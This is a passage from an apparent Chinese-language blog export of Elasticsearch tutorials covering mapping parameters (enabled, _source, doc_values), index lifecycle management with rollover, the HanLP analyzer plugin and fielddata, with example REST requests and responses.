&quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;在上面，我们通过mapping对user字段进行了修改：1234&quot;user&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;enabled&quot;: false &#125;也就是说这个字段将不被建立索引，我们如果使用这个字段进行搜索的话，不会产生任何的结果：12345678GET twitter/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user&quot;: &quot;张三&quot; &#125; &#125;&#125;搜索的结果为：123456789101112131415161718&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 0, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;&#125;显然是没有任何的结果。但是如果我们对这个文档进行查询的话：1GET twitter/_doc/1显示的结果是：123456789101112131415161718192021222324252627282930&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot; : &#123; &quot;firstname&quot; : &quot;三&quot;, &quot;surname&quot; : &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125;&#125;显然user的信息是存放于source里的。只是它不被我们所搜索而已。如果我们不想我们的整个文档被搜索，我们甚至可以直接采用如下的方法：12345678DELETE twitter PUT twitter &#123; &quot;mappings&quot;: &#123; &quot;enabled&quot;: false &#125;&#125;那么整个twitter索引将不建立任何的inverted index，那么我们通过如下的命令：12345678910111213141516171819202122232425262728293031PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125; GET twitter/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;&#125;上面的命令执行的结果是，没有任何搜索的结果。更多阅读，可以参阅“Mapping parameters: enabled”(https://www.elastic.co/guide/en/elasticsearch/reference/current/enabled.html)。Source在Elasticsearch中，通常每个文档的每一个字段都会被存储在shard里存放source的地方，比如：12345678910111213141516171819202122PUT twitter/_doc/2&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;在这里，我们创建了一个id为2的文档。我们可以通过如下的命令来获得它的所有的存储的信息。1GET twitter/_doc/2它将返回：123456789101112131415161718192021222324252627282930&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 1, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot; : &#123; &quot;firstname&quot; : &quot;三&quot;, &quot;surname&quot; : &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125;&#125;在上面的_source里我们可以看到Elasticsearch为我们所存下的所有的字段。如果我们不想存储任何的字段，那么我们可以做如下的设置：12345678910DELETE twitter PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;_source&quot;: &#123; &quot;enabled&quot;: false &#125; &#125;&#125;那么我们使用如下的命令来创建一个id为1的文档：12345678910111213141516171819202122PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;那么同样地，我们来查询一下这个文档：1GET witter/_doc/1显示的结果为：123456789&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1, &quot;found&quot; : true&#125;显然我们的文档是被找到了，但是我们看不到任何的source。那么我们能对这个文档进行搜索吗？尝试如下的命令：12345678GET twitter/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;&#125;显示的结果为：12345678910111213141516171819202122232425&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.5753642, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.5753642 &#125; ] &#125;&#125;显然这个文档id为1的文档可以被正确地搜索，也就是说它有完好的inverted index供我们查询，虽然它没有字的source。那么我们如何有选择地进行存储我们想要的字段呢？这种情况适用于我们想节省自己的存储空间，只存储那些我们需要的字段到source里去。我们可以做如下的设置：1234567891011121314151617DELETE twitter PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;_source&quot;: &#123; &quot;includes&quot;: [ &quot;*.lat&quot;, &quot;address&quot;, &quot;name.*&quot; ], &quot;excludes&quot;: [ &quot;name.surname&quot; ] &#125; &#125;&#125;在上面，我们使用include来包含我们想要的字段，同时我们通过exclude来去除那些不需要的字段。我们尝试如下的文档输入：12345678910111213141516171819202122PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;通过如下的命令来进行查询，我们可以看到：1GET twitter/_doc/1结果是：123456789101112131415161718192021&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;name&quot; : &#123; &quot;firstname&quot; : &quot;三&quot; &#125;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot; &#125; &#125;&#125;显然，我们只有很少的几个字段被存储下来了。通过这样的方法，我们可以有选择地存储我们想要的字段。在实际的使用中，我们在查询文档时，也可以有选择地进行显示我们想要的字段，尽管有很多的字段被存于source中：1GET twitter/_doc/1?_source=name,location在这里，我们只想显示和name及location相关的字段，那么显示的结果为：1234567891011121314151617&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;name&quot; : &#123; &quot;firstname&quot; : &quot;三&quot; &#125;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot; &#125; &#125;&#125;更多的阅读，可以参阅文档“Mapping meta-field: _source”(https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-source-field.html)Doc_values默认情况下，大多数字段都已编入索引，这使它们可搜索。反向索引允许查询在唯一的术语排序列表中查找搜索词，并从中立即访问包含该词的文档列表。sort，aggregtion和访问脚本中的字段值需要不同的数据访问模式。除了查找术语和查找文档外，我们还需要能够查找文档并查找其在字段中具有的术语。Doc values是在文档索引时构建的磁盘数据结构，这使这种数据访问模式成为可能。它们存储与_source相同的值，但以面向列的方式存储，这对于排序和聚合而言更为有效。几乎所有字段类型都支持Doc值，但对字符串字段除外。默认情况下，所有支持doc值的字段均已启用它们。如果您确定不需要对字段进行排序或汇总，也不需要通过脚本访问字段值，则可以禁用doc值以节省磁盘空间：比如我们可以通过如下的方式来使得city字段不可以做sort或aggregation：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108DELETE twitterPUT twitter&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;city&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;doc_values&quot;: false, &quot;ignore_above&quot;: 256 &#125;, &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;age&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;country&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;location&quot;: &#123; &quot;properties&quot;: &#123; &quot;lat&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;lon&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;, &quot;message&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;name&quot;: &#123; &quot;properties&quot;: &#123; &quot;firstname&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;surname&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;, &quot;province&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;uid&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;user&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;&#125;在上面，我们把city字段的doc_values设置为false。12345&quot;city&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;doc_values&quot;: false, &quot;ignore_above&quot;: 256&#125;,我们通过如下的方法来创建一个文档：12345678910111213141516171819202122PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;那么，当我们使用如下的方法来进行aggregation时：123456789101112GET twitter/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;city_bucket&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;city&quot;, &quot;size&quot;: 10 &#125; &#125; &#125;&#125;在我们的Kibana上我们可以看到：12345678910111213141516171819202122232425262728293031323334&#123; &quot;error&quot;: &#123; &quot;root_cause&quot;: [ &#123; &quot;type&quot;: &quot;illegal_argument_exception&quot;, &quot;reason&quot;: &quot;Can&apos;t load fielddata on [city] because fielddata is unsupported on fields of type [keyword]. Use doc values instead.&quot; &#125; ], &quot;type&quot;: &quot;search_phase_execution_exception&quot;, &quot;reason&quot;: &quot;all shards failed&quot;, &quot;phase&quot;: &quot;query&quot;, &quot;grouped&quot;: true, &quot;failed_shards&quot;: [ &#123; &quot;shard&quot;: 0, &quot;index&quot;: &quot;twitter&quot;, &quot;node&quot;: &quot;IyyZ30-hRi2rnOpfx4n1-A&quot;, &quot;reason&quot;: &#123; &quot;type&quot;: &quot;illegal_argument_exception&quot;, &quot;reason&quot;: &quot;Can&apos;t load fielddata on [city] because fielddata is unsupported on fields of type [keyword]. Use doc values instead.&quot; &#125; &#125; ], &quot;caused_by&quot;: &#123; &quot;type&quot;: &quot;illegal_argument_exception&quot;, &quot;reason&quot;: &quot;Can&apos;t load fielddata on [city] because fielddata is unsupported on fields of type [keyword]. Use doc values instead.&quot;, &quot;caused_by&quot;: &#123; &quot;type&quot;: &quot;illegal_argument_exception&quot;, &quot;reason&quot;: &quot;Can&apos;t load fielddata on [city] because fielddata is unsupported on fields of type [keyword]. Use doc values instead.&quot; &#125; &#125; &#125;, &quot;status&quot;: 400&#125;显然，我们的操作是失败的。尽管我们不能做aggregation及sort，但是我们还是可以通过如下的命令来得到它的source：1GET twitter/_doc/1显示结果为：123456789101112131415161718192021222324252627282930&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot; : &#123; &quot;firstname&quot; : &quot;三&quot;, &quot;surname&quot; : &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125;&#125;更多阅读请参阅“Mapping parameters: doc_values”(https://www.elastic.co/guide/en/elasticsearch/reference/7.4/doc-values.html)。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Index生命周期管理入门]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9AIndex%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[如果您要处理时间序列数据，则不想将所有内容连续转储到单个索引中。 取而代之的是，您可以定期将数据滚动到新索引，以防止数据过大而又缓慢又昂贵。 随着索引的老化和查询频率的降低，您可能会将其转移到价格较低的硬件上，并减少分片和副本的数量。要在索引的生命周期内自动移动索引，可以创建策略来定义随着索引的老化对索引执行的操作。 索引生命周期策略在与Beats数据发件人一起使用时特别有用，Beats数据发件人不断将运营数据（例如指标和日志）发送到Elasticsearch。 当现有索引达到指定的大小或期限时，您可以自动滚动到新索引。 这样可以确保所有索引具有相似的大小，而不是每日索引，其大小可以根beats数和发送的事件数而有所不同。让我们通过动手操作场景跳入索引生命周期管理（Index cycle management: ILM）。 本文章将利用您可能不熟悉的ILM独有的许多新概念。 我们先用一个示例来展示。本示例的目标是建立一组索引，这些索引将封装来自时间序列数据源的数据。 我们可以想象有一个像Filebeat这样的系统，可以将文档连续索引到我们的书写索引中。 我们希望在索引达到50 GB，或文档的数量超过10000，或已在30天前创建索引后对其进行rollover，然后在90天后删除该索引。上图显示一个Log文档在Elasticsearch中生命周期。运行两个node的Elasticsearch集群我们可以参考文章“Elasticsearch：运用shard filtering来控制索引分配给哪个节点”运行起来两个node的cluster。其实非常简单，当我们安装好Elasticsearch后，打开一个terminal，并运行如下的命令：1./bin/elasticsearch -E node.name=node1 -E node.attr.data=hot -Enode.max_local_storage_nodes=2它将运行起来一个叫做node1的节点。同时在另外terminal中运行如下的命令：1./bin/elasticsearch -E node.name=node2 -E node.attr.data=warm -Enode.max_local_storage_nodes=2它运行另外一个叫做node2的节点。我们可以通过如下的命令来进行查看：1GET _cat/nodes?v显示两个节点：我们可以用如下的命令来检查这两个node的属性：1GET _cat/nodeattrs?v&amp;s=name显然其中的一个node是hot，另外一个是warm。准备数据运行起来我们的Kibana:我们分别点击上面的1和2处：点击上面的“Add data”。这样我们就可以把我们的kibana_sample_data_logs索引加载到Elasticsearch中。我们可以通过如下的命令进行查看：1GET _cat/indices/kibana_sample_data_logs命令显示结果为：它显示kibana_sample_data_logs具有11.1M的数据，并且它有14074个文档。建立ILM policy我们可以通过如下的方法来建立一个ILM的policy.123456789101112131415161718192021222324252627PUT _ilm/policy/logs_policy&#123; &quot;policy&quot;: &#123; &quot;phases&quot;: &#123; &quot;hot&quot;: &#123; &quot;min_age&quot;: &quot;0ms&quot;, &quot;actions&quot;: &#123; &quot;rollover&quot;: &#123; &quot;max_size&quot;: &quot;50gb&quot;, &quot;max_age&quot;: &quot;30d&quot;, &quot;max_docs&quot;: 10000 &#125;, &quot;set_priority&quot;: &#123; &quot;priority&quot;: 100 &#125; &#125; &#125;, &quot;delete&quot;: &#123; &quot;min_age&quot;: &quot;90d&quot;, &quot;actions&quot;: &#123; &quot;delete&quot;: &#123;&#125; &#125; &#125; &#125; &#125;&#125;这里定义的一个policy意思是：如果一个index的大小超过50GB，那么自动rollover如果一个index日期已在30天前创建索引后，那么自动rollover如果一个index的文档数超过10000，那么也会自动rollover当一个index创建的时间超过90天，那么也自动删除其实这个我们也可以通过Kibana帮我们来实现。请按照如下的步骤：紧接着点击“Index Lifecycle Policies”：再点击“Create Policy”:最后点“Save as new Policy”及可以在我们的Kibana中同过如下的命令可以查看到：1GET _ilm/policy/logs_policy显示结果：设置Index template我们可以通过如下的方法来建立template:1234567891011PUT _template/datastream_template&#123; &quot;index_patterns&quot;: [&quot;logs*&quot;], &quot;settings&quot;: &#123; &quot;number_of_shards&quot;: 1, &quot;number_of_replicas&quot;: 1, &quot;index.lifecycle.name&quot;: &quot;logs_policy&quot;, &quot;index.routing.allocation.require.data&quot;: &quot;hot&quot;, &quot;index.lifecycle.rollover_alias&quot;: &quot;logs&quot; &#125;&#125;这里的意思是所有以logs开头的index都需要遵循这个规律。这里定义了rollover的alias为“logs ”。这在我们下面来定义。同时也需要注意的是”index.routing.allocation.require.data”: “hot”。这个定义了我们需要indexing的node的属性是hot。请看一下我们上面的policy里定义的有一个叫做phases里的，它定义的是”hot”。在这里我们把所有的logs*索引都置于hot属性的node里。在实际的使用中，hot属性的index一般用作indexing。我们其实还可以定义一些其它phase，比如warm，这样可以把我们的用作搜索的index置于warm的节点中。这里就不一一描述了。定义Index alias我们可以通过如下的方法来定义：12345678PUT logs-000001&#123; &quot;aliases&quot;: &#123; &quot;logs&quot;: &#123; &quot;is_write_index&quot;: true &#125; &#125;&#125;在这里定义了一个叫做logs的alias，它指向logs-00001索引。注意这里的is_write_index为true。如果有rollover发生时，这个alias会自动指向最新rollover的index。生产数据在这里，我们使用之前我们已经导入的测试数据kibana_sample_data_logs，我们可以通过如下的方法来写入数据：123456789POST _reindex?requests_per_second=500&#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;kibana_sample_data_logs&quot; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;logs&quot; &#125;&#125;上面的意思是每秒按照500个文档从kibana_sample_data_logs索引reindex文档到logs别名所指向的index。我们运行后，通过如下的命令来查看最后的结果：1GET logs*/_count显示如下：我们可以看到有14074个文档被reindex到logs*索引中。通过如下的命令来查看：1GET _cat/shards/logs*我们可以看到logs-000002已经生产，并且所有的索引都在node1上面。我们可以通过如下的命令：1GET _cat/indices/logs?v我们可以看到logs-000001索引中有10000个文档，而logs-000002中含有4074个文档。由于我们已经设定了policy，那么所有的这些logs*索引的生命周期只有90天。90天过后（从索引被创建时算起），索引会自动被删除掉。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：hanlp 中文分词器]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Ahanlp%20%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E5%99%A8%2F</url>
    <content type="text"><![CDATA[HanLP 中文分词器是一个开源的分词器，是专为Elasticsearch而设计的。它是基于HanLP，并提供了HanLP中大部分的分词方式。它的源码位于：https://github.com/KennFalcon/elasticsearch-analysis-hanl从Elasticsearch 5.2.2开始，一直有跟随Elasticsearch的不同发行版而更新。安装1） 方式一：a. 下载对应的release安装包，最新release包可从baidu盘下载（链接:https://pan.baidu.com/s/1mFPNJXgiTPzZeqEjH_zifw 密码:i0o7）b. 执行如下命令安装，其中PATH为插件包绝对路径：1./bin/elasticsearch-plugin install file://$&#123;PATH&#125;2）方式二：a. 使用elasticsearch插件脚本安装command如下：1./bin/elasticsearch-plugin install https://github.com/KennFalcon/elasticsearch-analysis-hanlp/releases/download/v7.4.2/elasticsearch-analysis-hanlp-7.4.2.zip安装完后，我们可以使用如下的方式来验证我们的安装是否成功：12$ ./bin/elasticsearch-plugin listanalysis-hanlp如果我们安装时成功的话，我们可以看到上面的输出。安装数据包release包中存放的为HanLP源码中默认的分词数据，若要下载完整版数据包，请查看HanLP Release。数据包目录：ES_HOME/plugins/analysis-hanlp注：因原版数据包自定义词典部分文件名为中文，这里的hanlp.properties中已修改为英文，请对应修改文件名重启Elasticsearch注：上述说明中的ES_HOME为自己的ES安装路径，需要绝对路径。这一步非常重要。如果我们不重新启动，新安装的分词器将不会工作。热更新在本版本中，增加了词典热更新，修改步骤如下：a. 在ES_HOME/plugins/analysis-hanlp/data/dictionary/custom目录中新增自定义词典b. 修改hanlp.properties，修改CustomDictionaryPath，增加自定义词典配置c. 等待1分钟后，词典自动加载注：每个节点都需要做上述更改提供的分词方式说明hanlp: hanlp默认分词hanlp_standard: 标准分词hanlp_index: 索引分词hanlp_nlp: NLP分词hanlp_n_short: N-最短路分词hanlp_dijkstra: 最短路分词hanlp_crf: CRF分词（已有最新方式）hanlp_speed: 极速词典分词我们来做一个简单的例子：12345GET _analyze&#123; &quot;text&quot;: &quot;美国阿拉斯加州发生8.0级地震&quot;, &quot;tokenizer&quot;: &quot;hanlp&quot;&#125;那么显示的结果为：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;美国&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 2, &quot;type&quot; : &quot;nsf&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;阿拉斯加州&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;nsf&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;发生&quot;, &quot;start_offset&quot; : 7, &quot;end_offset&quot; : 9, &quot;type&quot; : &quot;v&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;8.0&quot;, &quot;start_offset&quot; : 9, &quot;end_offset&quot; : 12, &quot;type&quot; : &quot;m&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;级&quot;, &quot;start_offset&quot; : 12, &quot;end_offset&quot; : 13, &quot;type&quot; : &quot;q&quot;, &quot;position&quot; : 4 &#125;, &#123; &quot;token&quot; : &quot;地震&quot;, &quot;start_offset&quot; : 13, &quot;end_offset&quot; : 15, &quot;type&quot; : &quot;n&quot;, &quot;position&quot; : 5 &#125; ]&#125;更多详细阅读，请参阅链接https://github.com/KennFalcon/elasticsearch-analysis-hanlp]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：fielddata 介绍]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Afielddata%20%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[默认情况下，大多数字段都已编入索引，这使它们可搜索。 但是，脚本中的排序，聚合和访问字段值需要与搜索不同的访问模式。搜索需要回答“哪个文档包含该术语？”这个问题，而排序和汇总则需要回答一个不同的问题：“此字段对该文档的值是什么？”。大多数字段可以将索引时生产的磁盘doc_values(https://www.elastic.co/guide/en/elasticsearch/reference/current/doc-values.html)用于此数据访问模式，但是文本（text）字段不支持doc_values。替代的方案，文本（text）字段使用查询时内存中的数据结构，称为fielddata。 当我们首次将该字段用于聚合，排序或在脚本中使用时，将按需构建此数据结构。 它是通过从磁盘读取每个段的整个反向索引，反转术语↔︎文档关系并将结果存储在JVM堆中的内存中来构建的。Fielddata针对text字段在默认时是禁用的Fielddata会占用大量堆空间，尤其是在加载大量的文本字段时。 一旦将字段数据加载到堆中，它在该段的生命周期内将一直保留在那里。 同样，加载字段数据是一个昂贵的过程，可能导致用户遇到延迟的情况。 这就是默认情况下禁用字段数据的原因。假如我们创建一个如下的myindex的索引：123456789101112131415PUT myindex&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125; &#125;&#125; PUT myindex/_doc/1&#123; &quot;address&quot;: &quot;New York&quot; &#125;如果您尝试对文本字段中的脚本进行排序，汇总或访问值:123456789101112GET myindex/_search&#123; &quot;size&quot;: 20, &quot;aggs&quot;: &#123; &quot;aggr_mame&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: 